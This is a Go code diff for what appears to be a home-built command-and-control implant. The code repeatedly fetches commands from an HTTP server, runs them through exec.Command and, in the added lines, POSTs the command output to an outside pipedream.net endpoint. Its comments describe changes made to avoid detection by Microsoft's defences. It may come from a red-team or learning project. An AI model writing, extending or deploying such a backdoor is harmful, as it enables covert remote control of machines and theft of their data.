@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -34,7 +35,7 @@ func main() {
 	client := http.Client{}
 	// The request itself, a simple GET to the py server hosting index.html with whoami written
 	// This will need to be changed to a UUID that's generated at each run time
-	req, err := http.NewRequest("GET", "http://192.168.1.166:8000", nil)
+	req, err := http.NewRequest("GET", "http://192.168.1.254:8000", nil)
 	req.Header.Add("APPSESSIONID", uuid)
 	resp, err := client.Do(req)
 	if err != nil {
@@ -49,7 +50,7 @@ func main() {
 
 	//Convert the body to type string
 	sb := string(body)
-	fmt.Printf(sb)
+	// fmt.Printf(sb)
 
 	// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
 	sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
@@ -57,17 +58,23 @@ func main() {
 	cmd := exec.Command(sb1)
 
 	result, _ := cmd.Output()
-	time.Sleep(10)
-	req, err = http.NewRequest("GET", "http://192.168.1.166:8000", nil)
-	req.Header.Add("APPSESSIONID", uuid)
-	req.Header.Add("REZ", string(result))
-	resp, err = client.Do(req)
+	toSend := []byte(result)
 
-	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating
-	// Add two features: 1) Spawn a new parent process whos context we execute ocmmands under 2) add a profile.json section with which the destination, delay, HTTP method, and user agent can all be customized
+	time.Sleep(10)
+	req, err = http.NewRequest("POST", "https://eoqqzdfuzmgq7gg.m.pipedream.net", bytes.NewReader(toSend))
+	req.Header.Add("APPSESSIONID", uuid)
+	req.Header.Add("REZ", "test")
+	req.Header.Add("User-Agent", "testing testing")
+	resp, err = client.Do(req)
+	if err != nil {
+		panic(err)
+	}
+	defer resp.Body.Close()
+
+	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating [all done]
 	for true {
 
-		req, err = http.NewRequest("GET", "http://192.168.1.166:8000", nil)
+		req, err = http.NewRequest("GET", "http://192.168.1.254:8000", nil)
 		req.Header.Add("APPSESSIONID", uuid)
 		resp, err = client.Do(req)
 		body, err := ioutil.ReadAll(resp.Body)
@@ -77,7 +84,7 @@ func main() {
 
 		//Convert the body to type string
 		sb := string(body)
-		fmt.Printf(sb)
+		// fmt.Printf(sb)
 
 		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
 		sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
@@ -85,12 +92,17 @@ func main() {
 		cmd := exec.Command(sb1)
 
 		result, _ := cmd.Output()
+		toSend := []byte(result)
 
-		time.Sleep(10)
-		req, err = http.NewRequest("GET", "http://192.168.1.166:8000", nil)
+		time.Sleep(1000)
+		req, err = http.NewRequest("POST", "https://eoqqzdfuzmgq7gg.m.pipedream.net", bytes.NewReader(toSend))
 		req.Header.Add("APPSESSIONID", uuid)
-		req.Header.Add("REZ", string(result))
+		req.Header.Add("User-Agent", "testing testing")
 		resp, err = client.Do(req)
+		if err != nil {
+			panic(err)
+		}
+		defer resp.Body.Close()
 	}
 
 }
